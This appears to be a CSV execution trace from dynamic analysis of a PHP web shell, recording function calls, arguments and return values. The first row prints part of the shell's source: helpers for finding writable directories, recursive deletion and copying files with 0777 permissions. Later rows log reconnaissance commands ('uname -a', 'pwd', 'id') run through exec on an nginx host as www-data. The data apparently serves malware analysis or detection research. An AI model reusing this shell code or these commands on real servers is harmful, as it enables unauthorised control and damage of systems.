uuid,file_md5,index,source,target,argc,argv,return,dynamic
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,11,eval,zend_compile_string,2,"{""value"": [[0, ""source_string"", ""\r\n\r\nset_magic_quotes_runtime(0);\r\n\r\nif(strtolower(substr(PHP_OS,0,3)) == \""win\"") {\r\n    define('DS', \""\\\\\"") ;\r\n    $os = 'win';\r\n} else {\r\n    define('DS', \""/\"") ;\r\n    $os = 'nix';\r\n}\r\n\r\nif(!function_exists(\""scandir\"")) {\r\n\tfunction scandir($dir) {\r\n\t\t$dh  = opendir($dir);\r\n\t\twhile (false !== ($filename = readdir($dh)))\r\n    \t\t$files[] = $filename;\r\n\t\treturn $files;\r\n\t}\r\n}\r\n\r\nfunction scandir_rec($dir, $dirs_only=false, $maxdepth=0, $writable=false, $no_root=false) {\r\n    $_content = scandir($dir) ;\r\n    $content = array() ;\r\n\r\n    if(!$no_root) {\r\n        if(is_dir($dir) || !$dirs_only) {\r\n            if(!$writable || is_writeable($dir)) {\r\n                $content[] = $dir ;\r\n            }\r\n        }\r\n    }\r\n\r\n    if($_content && is_array($_content)) {\r\n        foreach($_content as $k=>$v) {\r\n            if(!preg_match(\""/^\\./\"", $v)) {\r\n                if(is_dir($dir . DS . $v) || !$dirs_only) {\r\n                    if(!$writable || is_writeable($dir . DS . $v)) {\r\n                        $content[] = $dir . DS . $v ;\r\n                    }\r\n                }\r\n            }\r\n            if(!preg_match(\""/^\\./\"", $v) && is_dir($dir . DS . $v)) {\r\n                if($maxdepth > 0) { \r\n                    $__content = scandir_rec($dir . DS . $v, $dirs_only, $maxdepth-1, $writable, true) ;\r\n                    if($__content) {\r\n                        foreach($__content as $kk=>$vv) {\r\n                            if(is_dir($dir . DS . $v) || !$dirs_only) {\r\n                                if(!$writable || is_writeable($dir . DS . $vv)) {\r\n                                    $content[] = $vv ;\r\n                                }\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }    \r\n        }\r\n    }\r\n    return $content ;\r\n}\r\n\r\nfunction cust_function_exists($function) {\r\n  $disabled = explode(', ', ini_get('disable_functions'));\r\n  return !in_array($function, $disabled) && function_exists($function);\r\n}\r\n\r\nfunction deleteDir($path) {\r\n\t$path = (substr($path,-1)=='/') ? $path:$path.'/';\r\n\t$dh  = opendir($path);\r\n\twhile ( ($item = readdir($dh) ) !== false) {\r\n\t\t$item = $path.$item;\r\n\t\tif ( (basename($item) == \""..\"") || (basename($item) == \"".\"") )\r\n\t\t\tcontinue;\r\n\t\tif (is_dir($item)) {\r\n\t\t\tdeleteDir($item);\r\n        } elseif(is_file($item)) {\r\n            @unlink($item);\r\n        }\r\n    }\r\n\tclosedir($dh);\r\n\t@rmdir($path);\r\n}\r\n\r\nfunction smartCopy($source, $dest, $options=array('folderPermission'=>0777,'filePermission'=>0777)) {\r\n    $result=false;\r\n\r\n    if (is_file($source)) {\r\n        if ($dest[strlen($dest)-1]=='/') {\r\n            if (!file_exists($dest)) {\r\n                cmfcDirectory::makeAll($dest,$options['folderPermission'],true);\r\n            }\r\n            $__dest=$dest.\""/\"".basename($source);\r\n        } else {\r\n            $__dest=$dest;\r\n        }\r\n        $result=copy($source, $__dest);\r\n        chmod($__dest,$options['filePermission']);\r\n       \r\n     } elseif(is_dir($source)) {\r\n        if ($dest[strlen($dest)-1]=='/') {\r\n            if ($source[strlen($source)-1]=='/') {\r\n                //Copy only contents\r\n            } else {\r\n                //Change parent itself and its contents\r\n                $dest=$dest.basename($source);\r\n                @mkdir($dest);\r\n                chmod($dest,$options['filePermission']);\r\n            }\r\n        } else {\r\n            if ($source[strlen($source)-1]=='/') {\r\n                //Copy parent directory with new name and all its content\r\n                @mkdir($dest,$options['folderPermission']);\r\n                chmod($dest,$options['filePermission']);\r\n            } else {\r\n                //Copy parent directory with new name and all its content\r\n                @mkdir($dest,$options['folderPermission']);\r\n                chmod($dest,$options['filePermission']);\r\n            }\r\n        }\r\n\r\n        $dirHandle=opendir($source);\r\n        while($file=readdir($dirHandle))\r\n        {\r\n            if($file!=\"".\"" && $file!=\""..\"")\r\n            {\r\n                if(!is_dir($source.\""/\"".$file)) {\r\n                    $__des""]]}",{"value": "413C4141413C6A3C112B41413C262A41413C26413C0D2B8D2A000000000000000000000000000000294629462946294659732B41415051423C262A2659732B41415051423C262A26413C26413C26413C26112B262A294659732B50519D2A9D080859732B50519D2A9D0808294659732B50519D2A9D08082946373837294637383729462946294659732E505111342B262A29460808294629460808294629462946294629464141423C264141423C2659732E505111342B505151122B29462A294639505151420850515108413C3A0D2B505151080808085051510808413C262A2829462A294608080826423C262829464F4F3E"},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,12,eval,set_magic_quotes_runtime,1,"{""value"": [[0, ""new_setting"", 0]]}",{"value": "void"},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,13,eval,substr,3,"{""value"": [[0, ""str"", ""Linux""], [1, ""start"", 0], [2, ""length"", 3]]}",{"value": "Lin"},"[0, 0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,14,eval,strtolower,1,"{""value"": [[0, ""str"", ""Lin""]]}",{"value": "lin"},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,15,eval,define,2,"{""value"": [[0, ""constant_name"", ""DS""], [1, ""value"", ""/""]]}",{"value": "void"},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,16,eval,function_exists,1,"{""value"": [[0, ""function_name"", ""scandir""]]}",{"value": true},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,17,eval,system_custom,1,"{""value"": [[0, ""in"", ""uname -a""]]}",{"value": "Linux c4f2570e19cb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux"},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,18,system_custom,cust_function_exists,1,"{""value"": [[0, ""function"", ""exec""]]}",{"value": true},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,19,cust_function_exists,ini_get,1,"{""value"": [[0, ""varname"", ""disable_functions""]]}",{"value": ""},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,20,cust_function_exists,explode,2,"{""value"": [[0, ""separator"", "", ""], [1, ""str"", """"]]}",{"value": []},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,21,cust_function_exists,in_array,2,"{""value"": [[0, ""needle"", ""exec""], [1, ""haystack"", []]]}",{"value": false},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,22,cust_function_exists,function_exists,1,"{""value"": [[0, ""function_name"", ""exec""]]}",{"value": true},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,23,system_custom,exec,2,"{""value"": [[0, ""command"", ""uname -a""], [1, ""output"", """"]]}",{"value": "void"},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,24,system_custom,join,2,"{""value"": [[0, ""glue"", ""\n""], [1, ""pieces"", []]]}",{"value": "Linux c4f2570e19cb 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux"},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,25,eval,system_custom,1,"{""value"": [[0, ""in"", ""pwd""]]}",{"value": "/usr/share/nginx/html"},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,26,system_custom,cust_function_exists,1,"{""value"": [[0, ""function"", ""exec""]]}",{"value": true},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,27,cust_function_exists,ini_get,1,"{""value"": [[0, ""varname"", ""disable_functions""]]}",{"value": ""},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,28,cust_function_exists,explode,2,"{""value"": [[0, ""separator"", "", ""], [1, ""str"", """"]]}",{"value": []},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,29,cust_function_exists,in_array,2,"{""value"": [[0, ""needle"", ""exec""], [1, ""haystack"", []]]}",{"value": false},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,30,cust_function_exists,function_exists,1,"{""value"": [[0, ""function_name"", ""exec""]]}",{"value": true},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,31,system_custom,exec,2,"{""value"": [[0, ""command"", ""pwd""], [1, ""output"", """"]]}",{"value": "void"},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,32,system_custom,join,2,"{""value"": [[0, ""glue"", ""\n""], [1, ""pieces"", []]]}",{"value": "/usr/share/nginx/html"},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,33,eval,system_custom,1,"{""value"": [[0, ""in"", ""id""]]}",{"value": "uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)"},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,34,system_custom,cust_function_exists,1,"{""value"": [[0, ""function"", ""exec""]]}",{"value": true},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,35,cust_function_exists,ini_get,1,"{""value"": [[0, ""varname"", ""disable_functions""]]}",{"value": ""},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,36,cust_function_exists,explode,2,"{""value"": [[0, ""separator"", "", ""], [1, ""str"", """"]]}",{"value": []},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,37,cust_function_exists,in_array,2,"{""value"": [[0, ""needle"", ""exec""], [1, ""haystack"", []]]}",{"value": false},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,38,cust_function_exists,function_exists,1,"{""value"": [[0, ""function_name"", ""exec""]]}",{"value": true},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,39,system_custom,exec,2,"{""value"": [[0, ""command"", ""id""], [1, ""output"", """"]]}",{"value": "void"},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,40,system_custom,join,2,"{""value"": [[0, ""glue"", ""\n""], [1, ""pieces"", []]]}",{"value": "uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)"},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,41,eval,zend_fetch_r_server,1,"{""value"": [[0, ""op1"", ""_SERVER""]]}",{"value": []},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,42,eval,str_replace,3,"{""value"": [[0, ""search"", ""\\\""""], [1, ""replace"", ""\""""], [2, ""subject"", """"]]}",{"value": ""},"[0, 0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,43,eval,str_replace,3,"{""value"": [[0, ""search"", ""\\\\'""], [1, ""replace"", ""\\'""], [2, ""subject"", """"]]}",{"value": ""},"[0, 0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,44,eval,system_custom,1,"{""value"": [[0, ""in"", ""cd /usr/share/nginx/html;""]]}",{"value": ""},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,45,system_custom,cust_function_exists,1,"{""value"": [[0, ""function"", ""exec""]]}",{"value": true},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,46,cust_function_exists,ini_get,1,"{""value"": [[0, ""varname"", ""disable_functions""]]}",{"value": ""},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,47,cust_function_exists,explode,2,"{""value"": [[0, ""separator"", "", ""], [1, ""str"", """"]]}",{"value": []},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,48,cust_function_exists,in_array,2,"{""value"": [[0, ""needle"", ""exec""], [1, ""haystack"", []]]}",{"value": false},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,49,cust_function_exists,function_exists,1,"{""value"": [[0, ""function_name"", ""exec""]]}",{"value": true},[0]
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,50,system_custom,exec,2,"{""value"": [[0, ""command"", ""cd /usr/share/nginx/html;""], [1, ""output"", """"]]}",{"value": "void"},"[0, 0]"
48b3adb85477b2dc764753fc21aa6bdd,94bd3a0c73c98b2cd899b4a270173b67,51,system_custom,join,2,"{""value"": [[0, ""glue"", ""\n""], [1, ""pieces"", []]]}",{"value": ""},"[0, 0]"
